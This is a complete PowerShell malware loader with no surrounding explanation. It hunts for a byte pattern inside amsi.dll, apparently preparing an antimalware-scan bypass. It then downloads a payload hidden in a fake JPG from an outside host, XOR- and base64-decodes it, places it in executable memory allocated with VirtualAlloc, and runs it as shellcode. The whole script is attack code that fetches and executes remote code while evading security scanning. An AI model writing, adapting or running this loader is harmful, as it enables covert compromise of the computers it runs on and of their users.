#Set-StrictMode -Version 2
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
}
"@
 
Add-Type $Kernel32
 
Class Hunter {
    static [IntPtr] FindAddress ([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0
 
            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }
 
        return $address
    }
}

function get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

function get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

If ([Environment]::OSVersion.VersionString -like "*10.*") {
    [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
    #Write-Host "[+] AMSI DLL Handle: $hModule"
 
    [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
    #Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
 
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,         
        0x49, 0x89, 0x5B, 0x08,   
        0x49, 0x89, 0x6B, 0x10,   
        0x49, 0x89, 0x73, 0x18,   
        0x57,                     
        0x41, 0x56,               
        0x41, 0x57,               
        0x48, 0x83, 0xEC, 0x70    
    )
    [IntPtr]$targetedAddress = [Hunter]:: FindAddress($dllCanUnloadNowAddress, $egg)
    #Write-Host "[+] Targeted address $targetedAddress"
 
    [string]$bytes = ""
    [int]$i = 0
    while ($i -lt $egg.Length) {
        [IntPtr]$targetedAddress = [IntPtr]::Add($targetedAddress, $i)
        $bytes += "0x" + [System.BitConverter]::ToString([System.Runtime.InteropServices.Marshal]::ReadByte($targetedAddress)) + " "
        $i++
    }
    #Write-Host "[+] Bytes: $bytes"
}

[Byte[]]$k = [System.Text.Encoding]::ASCII.GetBytes('p@ssw0rd')
$a = (New-Object System.Net.WebClient).DownloadString('https://www.comtop.club/logo/Plmj6.jpg') -match "(?<=0jbk)[\s\S]*?(?=0jbk)"
[Byte[]]$code = [System.Text.Encoding]::ASCII.GetBytes($matches[0])

for ($x = 0; $x -lt $code.Count; $x++) {
	$code[$x] = $k[$x%$k.Length] -bxor $code[$x]
}
[Char[]]$str = $code
[Byte[]]$byteArray = [System.Convert]::FromBase64CharArray($str, 0 ,$str.Length)

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualAlloc), (get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $byteArray.Length, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $var_buffer, $byteArray.length)
$runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (get_delegate_type @([IntPtr]) ([Void])))
$runme.Invoke([IntPtr]::Zero)
